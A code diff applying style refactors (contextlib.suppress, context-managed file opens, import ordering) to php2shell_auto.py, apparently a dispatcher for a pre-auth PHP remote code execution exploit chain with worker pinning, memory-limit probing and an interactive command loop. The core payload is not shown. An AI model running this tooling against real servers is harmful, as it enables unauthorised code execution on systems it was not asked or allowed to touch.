@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 php2shell_auto.py — version-aware dispatcher for the PHP2Shell RCE chain.
 
@@ -25,23 +24,23 @@ Authorized testing only.
 """
 
 from __future__ import annotations
-from php2shell_paths import default_repo_dir
-from php2shell_upstream import patch_params, patch_tls
 
 import argparse
+import contextlib
 import glob
+import ipaddress
 import json
 import os
-import ipaddress
 import re
 import socket
 import ssl
 import subprocess
-import time
 import sys
 import urllib.parse
 
+from php2shell_paths import default_repo_dir
 from php2shell_ui import UI
+from php2shell_upstream import patch_params, patch_tls
 
 FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
 HERE = os.path.dirname(os.path.abspath(__file__))
@@ -236,7 +235,7 @@ def load_profiles(directory: str):
     profiles = []
     for path in sorted(glob.glob(os.path.join(directory, "*.json"))):
         try:
-            with open(path, "r", encoding="utf-8") as fh:
+            with open(path, encoding="utf-8") as fh:
                 data = json.load(fh)
             if not isinstance(data, dict) or "php_version" not in data:
                 continue
@@ -302,13 +301,12 @@ def interactive_loop(args, profile, outdir, ui: UI) -> int:
             continue
         stage_script(outdir, line)
         output = os.path.join(outdir, "o")
-        try:
+        with contextlib.suppress(OSError):
             os.unlink(output)
-        except OSError:
-            pass
         rc = run_upstream(args, profile, output, huge, ui, stream=False)
         if os.path.isfile(output):
-            print(open(output, "r", encoding="utf-8", errors="replace").read().rstrip())
+            with open(output, encoding="utf-8", errors="replace") as handle:
+                print(handle.read().rstrip())
         else:
             ui.warn(f"no output (chain exit {rc})")
     return 0
@@ -386,10 +384,8 @@ class WorkerPins:
                    f"User-Agent: php2shell-pin/1.0\r\nConnection: keep-alive\r\n\r\n").encode()
             s.sendall(req)
             s.settimeout(3)
-            try:
+            with contextlib.suppress(OSError):
                 s.recv(65536)
-            except OSError:
-                pass
             self.socks.append(s)
 
     @classmethod
@@ -422,32 +418,24 @@ class WorkerPins:
                 s.sendall(req)
                 s.settimeout(2)
                 data = s.recv(65536)
-            except socket.timeout:
+            except TimeoutError:
                 if s is not None:
-                    try:
+                    with contextlib.suppress(OSError):
                         s.close()
-                    except OSError:
-                        pass
                 break
             except OSError:
                 if s is not None:
-                    try:
+                    with contextlib.suppress(OSError):
                         s.close()
-                    except OSError:
-                        pass
                 break
             if not data:
-                try:
+                with contextlib.suppress(OSError):
                     s.close()
-                except OSError:
-                    pass
                 break
             head = data.split(b"\r\n\r\n", 1)[0].lower()
             if b"connection: close" in head:
-                try:
+                with contextlib.suppress(OSError):
                     s.close()
-                except OSError:
-                    pass
                 for p in pins:
                     p.close()
                 return None
@@ -461,10 +449,8 @@ class WorkerPins:
 
     def close(self) -> None:
         for s in self.socks:
-            try:
+            with contextlib.suppress(OSError):
                 s.close()
-            except OSError:
-                pass
 
 
 def probe_memory_limit(args, ui: UI) -> int | None:
@@ -636,7 +622,7 @@ def main() -> int:
     profiles = load_profiles(args.profiles)
     catalog = {}
     try:
-        with open(args.catalog, "r", encoding="utf-8") as fh:
+        with open(args.catalog, encoding="utf-8") as fh:
             catalog = json.load(fh)
     except (OSError, ValueError):
         pass
@@ -805,7 +791,8 @@ def main() -> int:
         return 4
     if args.script:
         try:
-            body = open(args.script, "r", encoding="utf-8").read()
+            with open(args.script, encoding="utf-8") as handle:
+                body = handle.read()
         except OSError as exc:
             ui.crit(f"cannot read {args.script}: {exc}")
             return 4
@@ -886,10 +873,8 @@ def main() -> int:
         huge = args.huge_mb if args.huge_mb else oom_for(int(limit), profile)
         ui.stage("EXECUTE", f"memory_limit={limit}M  ·  huge_mb={huge}")
         if proof and os.path.exists(proof):
-            try:
+            with contextlib.suppress(OSError):
                 os.unlink(proof)
-            except OSError:
-                pass
         rc = run_upstream(args, profile, proof, huge, ui)
         if rc == 0:
             break
@@ -906,10 +891,9 @@ def main() -> int:
 
     detail = "proof retrieved by --fetch"
     if proof and os.path.isfile(proof):
-        try:
-            detail = open(proof, "r", encoding="utf-8", errors="replace").read().strip()
-        except OSError:
-            pass
+        with contextlib.suppress(OSError), \
+                open(proof, encoding="utf-8", errors="replace") as handle:
+            detail = handle.read().strip()
     ui.result(True, "PRE-AUTH RCE CONFIRMED", detail)
     return 0
 
